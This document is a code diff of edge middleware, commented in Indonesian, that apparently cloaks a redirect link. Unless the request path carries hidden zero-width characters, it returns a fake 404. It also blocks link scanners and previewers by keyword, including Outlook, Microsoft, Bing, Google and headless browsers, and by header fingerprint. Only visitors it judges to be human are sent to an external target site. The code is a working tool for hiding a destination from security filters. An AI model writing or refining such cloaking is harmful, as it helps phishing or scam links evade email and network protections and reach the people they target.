@@ -1,36 +1,39 @@
 export default function middleware(req) {
+  const url = new URL(req.url);
   const ua = req.headers.get('user-agent')?.toLowerCase() || '';
   
-  // 1. FINGERPRINTING UNIVERSAL (Mobile & Desktop)
+  // 1. DETEKSI KUNCI GAIB (ZWC)
+  // url.pathname akan berisi karakter yang sudah di-decode. 
+  // Kita cek apakah ada karakter khusus (Unicode) di dalam path.
+  const hasZwc = /[\u200B-\u200D\uFEFF]/.test(decodeURIComponent(url.pathname));
+
+  // 2. FILTER PINTU DEPAN: Jika tidak ada karakter gaib, kasih 404 (Pura-pura Mati)
+  if (!hasZwc) {
+    return new Response('404 Not Found', { status: 404 });
+  }
+
+  // 3. FINGERPRINTING MANUSIA (Agar bot ISP tidak tembus)
   const hasAcceptLang = req.headers.has('accept-language'); 
   const hasAccept = req.headers.get('accept')?.includes('text/html');
-  
-  // Deteksi Platform: Android, iPhone, atau Desktop modern
   const isMobile = /iphone|ipad|android/.test(ua);
   const isDesktop = /windows|macintosh|linux/.test(ua) && !/bot|crawler|spider/.test(ua);
 
-  // 2. DAFTAR HITAM BOT (Filter Bot Scanner)
+  // 4. DAFTAR HITAM BOT SCANNER
   const hardBotKeywords = [
     'bot', 'spider', 'crawler', 'scanner', 'outlook', 'office', 'microsoft',
     'linkdetect', 'bing', 'preview', 'headless', 'googleusercontent',
     'lighthouse', 'slurp', 'inspect', 'fetch', 'embed', 'clark', 'cloud'
   ];
-
   const isHardBot = hardBotKeywords.some(keyword => ua.includes(keyword));
 
-  // 3. LOGIKA FILTER (Sangat Akurat)
-  // - Blokir jika terdeteksi bot murni
-  // - ATAU Jika User-Agent terlalu pendek (Ciri bot mentah)
-  // - ATAU Jika tidak punya header bahasa (Bot jarang punya setting bahasa)
-  // - ATAU Jika bukan Mobile DAN bukan Desktop (Berarti mesin/script asing)
+  // 5. LOGIKA EKSEKUSI
+  // Jika dia bot, atau fingerprint tidak cocok (bukan mobile/desktop)
   if (isHardBot || ua.length < 35 || !hasAcceptLang || !hasAccept || (!isMobile && !isDesktop)) {
-    return new Response('Error 403: Access Denied', { 
-      status: 403,
-      headers: { 'Content-Type': 'text/plain' }
-    });
+    console.log(`BLOCKED BOT: IP=${req.ip} | UA=${ua}`);
+    return new Response('Error 403: Access Denied', { status: 403 });
   }
 
-  // 4. JIKA LOLOS (MANUSIA ASLI - HP MAUPUN PC)
+  // 6. REDIRECT TARGET (Hanya untuk yang bawa Kunci Gaib & Lolos Fingerprint)
   const targetUrl = 'https://nusaindahrp.com/?dev';
   
   return new Response(
